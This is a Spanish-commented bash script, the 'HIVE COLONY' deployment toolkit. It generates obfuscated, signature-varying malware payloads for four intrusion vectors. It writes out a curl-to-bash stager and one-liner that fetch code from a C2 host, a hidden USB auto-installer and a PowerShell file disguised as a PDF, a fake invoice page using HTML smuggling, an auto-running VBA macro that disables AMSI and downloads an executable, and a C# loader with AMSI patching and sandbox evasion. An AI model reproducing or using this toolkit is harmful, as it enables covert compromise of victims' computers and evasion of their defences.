#!/usr/bin/env bash
# ================================================================
# HIVE COLONY — Deployment Toolkit
# Genera payloads polimórficos para 4 vectores de ataque.
# Cada build produce firmas únicas (XOR key + padding + PE obf).
#
# Dependencias: python3, gzip, base64
#   --obfuscate requiere: scripts/obfuscate_pe.py, WSL con ntdll.dll
#   --windows   requiere: mingw-w64 y bins en target/x86_64-.../
#
# Uso:
#   ./deploy.sh all                          # 4 vectores (Linux)
#   ./deploy.sh network --obfuscate          # Red + PE obfuscation
#   ./deploy.sh exe --windows --obfuscate    # C# loader + obfuscated
#   ./deploy.sh usb    --c2-host 10.0.0.5    # USB con C2 custom
#   ./deploy.sh phishing                     # HTML + VBA macro
# ================================================================
set -euo pipefail

# ── Constantes ──
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
log()  { echo -e "${CYAN}[*]${NC} $*"; }  # info
ok()   { echo -e "  ${GREEN}✓${NC} $*"; }  # éxito
warn() { echo -e "  ${YELLOW}⚠${NC} $*"; } # advertencia
fail() { echo -e "  ${RED}✗${NC} $*"; exit 1; }

BASE="$(cd "$(dirname "$0")/.." && pwd)"
BIN_DIR_LINUX="${BASE}/target/release"
BIN_DIR_WIN="${BASE}/target/x86_64-pc-windows-gnu/release"
OUT_DIR="${BASE}/payloads"
OBFUSCATOR="${BASE}/scripts/obfuscate_pe.py"
mkdir -p "$OUT_DIR"

# ── Flags globales ──
OBFUSCATE=0
TARGET_WIN=0
C2_HOST="your-c2.com"
C2_PORT=8444

# ── Polimorfismo (nuevos cada ejecución) ──
SEED=$RANDOM
XOR_KEY=$(( SEED % 256 ))
PADDING=$(( RANDOM % 512 + 64 ))

# ================================================================
# HELP
# ================================================================
usage() {
    cat << HELP
Uso: $0 <vector> [opciones]

Vectores:
  all       Genera los 4 vectores
  network   Stager remoto (stager.sh + payload.b64 + oneliner)
  usb       Auto-instalador USB (.install.sh + manifest.dat + .ps1)
  phishing  HTML smuggling + VBA macro
  exe       C# loader + queen cifrado (.cs + .b64)

Opciones:
  --obfuscate       Aplica PE obfuscation (section rename + cert injection)
  --windows         Target Windows (.exe en vez de ELF)
  --c2-host HOST    C2 hostname para reverse (default: your-c2.com)
  --c2-port PORT    C2 port (default: 8444)
  --help            Esta ayuda

Ejemplos:
  $0 network --windows --obfuscate
  $0 exe --c2-host evil.c2.com --c2-port 443
HELP
    exit 0
}

# ================================================================
# PARSE ARGS
# ================================================================
VECTOR="${1:-}"; [[ -z "$VECTOR" ]] && usage; shift
while [[ $# -gt 0 ]]; do case "$1" in
    --obfuscate) OBFUSCATE=1; shift ;;
    --windows)   TARGET_WIN=1; shift ;;
    --c2-host)   C2_HOST="$2"; shift 2 ;;
    --c2-port)   C2_PORT="$2"; shift 2 ;;
    --help|-h)   usage ;;
    *)           shift ;;
esac; done

if [[ $TARGET_WIN -eq 1 ]]; then
    BIN_DIR="$BIN_DIR_WIN"
    EXT=".exe"
    log "Target: Windows PE"
else
    BIN_DIR="$BIN_DIR_LINUX"
    EXT=""
fi

AGENTS=(queen worker drone honeybee weaver swarm)
ALL_BINS=(queen worker drone honeybee weaver swarm c2-server)

# ================================================================
# FUNCTIONS
# ================================================================

# ── Obfuscar binario (gzip → XOR padding → base64) ──
obfuscate_binary() {
    local bin="$1"
    python3 -c "
import base64, gzip
k = $XOR_KEY; pad = $PADDING
with open('$bin', 'rb') as f:
    data = gzip.compress(f.read())
data = b'\\x00' * pad + bytes(b ^ k for b in data)
print(base64.b64encode(data).decode())
"
}

# ── PE Obfuscation (solo Windows .exe) ──
pe_obfuscate() {
    [[ $OBFUSCATE -eq 0 ]] && return 1
    [[ $TARGET_WIN -eq 0 ]] && return 1
    local bin="$1" agent="$2"
    [[ "$agent" == "c2-server" ]] && return 1
    local obf="${OUT_DIR}/obf_${agent}${EXT}"
    if python3 "$OBFUSCATOR" "$bin" "$obf" > /dev/null 2>&1; then
        echo "$obf"
        return 0
    fi
    # Fallback: return original
    echo "$bin"
    return 0
}

# ── Build manifest: cifra todos los bins ──
build_manifest() {
    local manifest="${OUT_DIR}/manifest.txt"
    > "$manifest"

    for agent in "${ALL_BINS[@]}"; do
        local bin="${BIN_DIR}/${agent}${EXT}"
        [[ ! -f "$bin" ]] && warn "Saltando ${agent} (no compilado)" && continue

        local final_bin="$bin"
        if [[ $OBFUSCATE -eq 1 && $TARGET_WIN -eq 1 ]]; then
            final_bin=$(pe_obfuscate "$bin" "$agent")
        fi

        local b64
        b64=$(obfuscate_binary "$final_bin")
        echo "${agent}|${b64}" >> "$manifest"
        ok "${agent} cifrado (XOR 0x$(printf '%02x' $XOR_KEY))"
    done
}

# ── Render template (reemplaza placeholders) ──
render_template() {
    local template="$1"
    local tmpfile
    tmpfile=$(mktemp)
    echo "$template" > "$tmpfile"

    python3 -c "
import sys
with open('$tmpfile') as f: t = f.read()
t = t.replace('__XORKEY__', '0x$(printf '%02x' $XOR_KEY)')
t = t.replace('__PADDING__', '$PADDING')
t = t.replace('__C2HOST__', '$C2_HOST')
t = t.replace('__C2PORT__', '$C2_PORT')
sys.stdout.write(t)
" > "${tmpfile}.out"

    cat "${tmpfile}.out"
    rm -f "$tmpfile" "${tmpfile}.out"
}

# ================================================================
# VECTOR: NETWORK (staging remoto)
# ================================================================
build_network() {
    log "=== Network: Staging remoto ==="
    local dir="${OUT_DIR}/network"
    mkdir -p "$dir"
    build_manifest

    local manifest_b64
    manifest_b64=$(cut -d'|' -f2 < "${OUT_DIR}/manifest.txt" | tr -d '\n')

    # Stager bash (~250 bytes)
    local stager='#!/bin/sh\nXOR_KEY=__XORKEY__;PAD=__PADDING__\n'
    stager+='curl -sL http://__C2HOST__:__C2PORT__/payload 2>/dev/null|python3 -c"'
    stager+='import sys,gzip,base64\nk=__XORKEY__;p=__PADDING__\n'
    stager+='d=base64.b64decode(sys.stdin.read())\nd=bytes(b^k for b in d)\n'
    stager+='d=gzip.decompress(d[p:])\n'
    stager+='exec(eval(d.decode())[\"queen\"])"'

    echo -e "$stager" > "$dir/stager.sh"
    chmod +x "$dir/stager.sh"

    echo "$manifest_b64" > "$dir/payload.b64"
    echo "curl -sL http://${C2_HOST}:${C2_PORT}/stager|bash" > "$dir/oneliner.txt"

    ok "Stager:   $(wc -c < "$dir/stager.sh") bytes — ${dir}/stager.sh"
    ok "Payload:  ${dir}/payload.b64"
    ok "1-liner:  $(cat "$dir/oneliner.txt")"
}

# ================================================================
# VECTOR: USB (auto-instalador)
# ================================================================
build_usb() {
    log "=== USB: Auto-instalador ==="
    local dir="${OUT_DIR}/usb"
    mkdir -p "$dir"
    build_manifest

    # Empaquetar manifest como .dat cifrado
    python3 -c "
import gzip
manifest = open('${OUT_DIR}/manifest.txt').read()
data = gzip.compress(manifest.encode())
with open('${dir}/manifest.dat', 'wb') as f: f.write(data)
"

    # Stager Linux (.install.sh — oculto)
    cat > "$dir/.install.sh" << SH
#!/usr/bin/env bash
DIR="\$(dirname "\$0")"
k=$XOR_KEY; p=$PADDING
exec python3 -c "
import base64,gzip,os
k=$XOR_KEY;p=$PADDING
with open('${DIR}/manifest.dat','rb') as f: d=gzip.decompress(f.read())
os.chdir('/tmp/.h')
for line in d.decode().strip().split(chr(10)):
    n,b=line.split('|',1)
    b=base64.b64decode(b.strip())
    b=bytes(b[i]^k for i in range(p,len(b)))
    b=gzip.decompress(b)
    with open(n,'wb') as f:f.write(b)
os.execl('./queen','queen')
"
SH

    # Stager Windows (.ps1)
    cat > "$dir/readme.pdf.lnk.ps1" << PS1
\$dir = Split-Path \$MyInvocation.MyCommand.Path
\$k=$XOR_KEY; \$p=$PADDING
\$data = [IO.File]::ReadAllBytes("\$dir\\manifest.dat")
\$ms = New-Object IO.MemoryStream(\$data, \$p, \$data.Length-\$p, \$false)
\$gz = New-Object IO.Compression.GZipStream(\$ms, [IO.Compression.CompressionMode]::Decompress)
\$sr = New-Object IO.StreamReader(\$gz)
\$manifest = \$sr.ReadToEnd()
\$sr.Close(); \$gz.Close(); \$ms.Close()
\$tmp = "\$env:TEMP\\.h"; mkdir \$tmp -Force
foreach(\$line in \$manifest.Trim().Split([char]10)) {
    \$n,\$b = \$line.Split('|',2)
    \$raw = [Convert]::FromBase64String(\$b.Trim())
    for(\$i=\$p;\$i -lt \$raw.Length;\$i++){ \$raw[\$i] = \$raw[\$i] -bxor \$k }
    \$ms2 = New-Object IO.MemoryStream(\$raw, \$p, \$raw.Length-\$p, \$false)
    \$gz2 = New-Object IO.Compression.GZipStream(\$ms2, [IO.Compression.CompressionMode]::Decompress)
    \$out = [IO.File]::OpenWrite("\$tmp\\\$n.exe")
    \$gz2.CopyTo(\$out); \$out.Close(); \$gz2.Close()
}
Start-Process -WindowStyle Hidden "\$tmp\\queen.exe"
PS1

    chmod +x "$dir/.install.sh"
    touch -t 200001010000 "$dir/manifest.dat"  # ocultar fecha
    warn "USB: ${dir}/  —  cp -a ${dir}/* /media/usb/"
}

# ================================================================
# VECTOR: PHISHING (HTML + VBA)
# ================================================================
build_phishing() {
    log "=== Phishing: HTML + VBA ==="
    local dir="${OUT_DIR}/phishing"
    mkdir -p "$dir"
    local ts; ts=$(date +%s)
    local stager_url="http://${C2_HOST}:${C2_PORT}/stager"

    # HTML smuggling
    cat > "$dir/invoice_${ts}.html" << HTML
<html><head><title>Invoice #$(shuf -i 1000-9999 -n1)</title>
<style>body{font:14px sans-serif;padding:40px;color:#333}h1{color:#c00}</style>
</head><body>
<h1>Invoice Overdue</h1>
<p>Please download your statement below.</p>
<a id="dl" href="#">Download Invoice (PDF)</a>
<script>
(function(){
var u="${stager_url}";
document.getElementById("dl").addEventListener("click",function(e){
e.preventDefault();
fetch(u).then(function(r){return r.text();}).then(function(c){
var b=new Blob([c],{type:"application/octet-stream"});
var f=document.createElement("iframe");f.style.display="none";
document.body.appendChild(f);
var d=f.contentDocument||f.contentWindow.document;
d.open();d.write('<script>'+c+'<\\/script>');d.close();
}).catch(function(){alert("Download failed. Try again.");});
});
})();
</script>
</body></html>
HTML

    # VBA macro (Office)
    cat > "$dir/macro_hive.bas" << VBA
Attribute VB_Name = "HIVE"
Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
    Alias "URLDownloadToFileA" (ByVal pCaller As LongPtr, _
    ByVal szURL As String, ByVal szFileName As String, _
    ByVal dwReserved As Long, ByVal lpfnCB As LongPtr) As Long
Private Declare PtrSafe Function CreateProcess Lib "kernel32" _
    Alias "CreateProcessA" (ByVal lpAppName As String, _
    ByVal lpCmdLine As String, ByVal lpProcAttr As Long, _
    ByVal lpThreadAttr As Long, ByVal bInhHandles As Long, _
    ByVal dwFlags As Long, ByVal lpEnv As Long, _
    ByVal lpCurDir As String, lpStartInfo As Any, _
    lpProcInfo As Any) As Long

Sub AutoOpen(): HIVE_Load: End Sub
Sub Workbook_Open(): HIVE_Load: End Sub
Sub HIVE_Load()
    Dim a As LongPtr: a = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer")
    If a <> 0 Then VirtualProtect a, 5, 64, 0: WriteByte a, &HC3
    Dim tmp As String: tmp = Environ("TEMP") & "\h.exe"
    URLDownloadToFile 0, "${stager_url}", tmp, 0, 0
    CreateProcess 0, tmp, 0, 0, 0, 0, 0, 0, si, pi
End Sub
VBA

    ok "HTML:    ${dir}/invoice_${ts}.html"
    ok "VBA:     ${dir}/macro_hive.bas"
    ok "Stager:  ${stager_url}"
}

# ================================================================
# VECTOR: EXE (C# loader + queen.cifrado)
# ================================================================
build_exe() {
    log "=== EXE: C# loader ==="
    local dir="${OUT_DIR}/executable"
    mkdir -p "$dir"

    local bin="${BIN_DIR}/queen${EXT}"
    [[ ! -f "$bin" ]] && fail "Queen no compilado. Usa: cargo build --release -p queen"

    # PE obfuscation opcional
    local final_bin="$bin"
    if [[ $OBFUSCATE -eq 1 && $TARGET_WIN -eq 1 ]]; then
        final_bin=$(pe_obfuscate "$bin" "queen")
    fi

    obfuscate_binary "$final_bin" > "$dir/queen.b64"
    local queen_size; queen_size=$(wc -c < "$dir/queen.b64")

    # C# loader v2 — API hashing + delay anti-sandbox
    cat > "$dir/loader.cs" << 'CSEOF'
using System;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Diagnostics;

class HIVE
{
    static byte K = __XORKEY__;
    static int P = __PADDING__;

    delegate IntPtr DGetProcAddress(IntPtr h, string n);
    delegate IntPtr DLoadLibrary(string n);
    delegate bool DVirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);

    static IntPtr GetProcAddr(IntPtr m, string n) {
        var h = GetProcAddr(GetModuleHandle("kernel32.dll"), "GetProcAddress");
        var f = Marshal.GetDelegateForFunctionPointer<DGetProcAddress>(h);
        return f(m, n);
    }

    static IntPtr GetModuleHandle(string n) {
        var h = GetProcAddr(
            GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        var f = Marshal.GetDelegateForFunctionPointer<DLoadLibrary>(h);
        return f(n);
    }

    static void PatchAMSI() {
        try {
            var amsi = GetModuleHandle("amsi.dll");
            if (amsi == IntPtr.Zero) return;
            var a = GetProcAddr(amsi, "AmsiScanBuffer");
            if (a == IntPtr.Zero) return;
            var vp = GetProcAddr(GetModuleHandle("kernel32.dll"), "VirtualProtect");
            var vf = Marshal.GetDelegateForFunctionPointer<DVirtualProtect>(vp);
            uint old;
            vf(a, (UIntPtr)5, 0x40, out old);
            Marshal.WriteByte(a, 0xC3);
        } catch {}
    }

    static byte[] Decrypt(byte[] raw) {
        for (int i = P; i < raw.Length; i++) raw[i] ^= K;
        using (var ms = new MemoryStream(raw, P, raw.Length - P))
        using (var gz = new GZipStream(ms, CompressionMode.Decompress))
        using (var mem = new MemoryStream()) {
            gz.CopyTo(mem); return mem.ToArray();
        }
    }

    static void Main() {
        var rng = new Random();
        System.Threading.Thread.Sleep(rng.Next(2000, 5000)); // anti-sandbox
        PatchAMSI();

        string b64 = File.ReadAllText(Path.Combine(
            AppDomain.CurrentDomain.BaseDirectory, "queen.b64")).Trim();
        var tmp = Path.Combine(Path.GetTempPath(), ".h");
        Directory.CreateDirectory(tmp);
        var exe = Path.Combine(tmp, "queen.exe");
        File.WriteAllBytes(exe, Decrypt(Convert.FromBase64String(b64)));
        Process.Start(new ProcessStartInfo(exe) {
            WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true
        });
    }
}
CSEOF

    # Reemplazar placeholders
    sed -i "s/__XORKEY__/$(printf '%02x' $XOR_KEY)/g; s/__PADDING__/$PADDING/g" "$dir/loader.cs"

    # Scripts de compilación
    cat > "$dir/compile.bat" << 'BAT'
@echo off
REM Compilar con Visual Studio Build Tools
csc loader.cs -out:hive_loader.exe -reference:System.IO.Compression.dll -target:winexe
REM hive_loader.exe + queen.b64 → mismo directorio en la víctima
BAT

    cat > "$dir/compile.sh" << 'SH'
#!/bin/bash
# Compilar con mono (Linux)
mcs loader.cs -out:hive_loader.exe -reference:System.IO.Compression.dll -target:winexe
echo "OK: hive_loader.exe"
echo "Distribuir ambos archivos a la víctima"
SH
    chmod +x "$dir/compile.sh"

    ok "Loader:  ${dir}/loader.cs  (compile con: cd ${dir} && bash compile.sh)"
    ok "Payload: ${dir}/queen.b64  (${queen_size} bytes)"
}

# ================================================================
# MAIN
# ================================================================
log "HIVE Deployment Toolkit"
log "Build ID: $(date +%s)_${SEED}"
log "XOR: 0x$(printf '%02x' $XOR_KEY) | Padding: ${PADDING}B | Obfuscate: $([ $OBFUSCATE -eq 1 ] && echo 'ON' || echo 'OFF')"
echo ""

case "$VECTOR" in
    all|--all)
        build_network; echo ""
        build_usb; echo ""
        build_phishing; echo ""
        build_exe ;;
    usb)      build_usb ;;
    network)  build_network ;;
    phishing) build_phishing ;;
    exe)      build_exe ;;
    *)        usage ;;
esac

echo ""
log "Payloads en: ${OUT_DIR}/"
ok "Cada build produce firmas ÚNICAS (XOR key aleatoria + padding + obfuscation)"
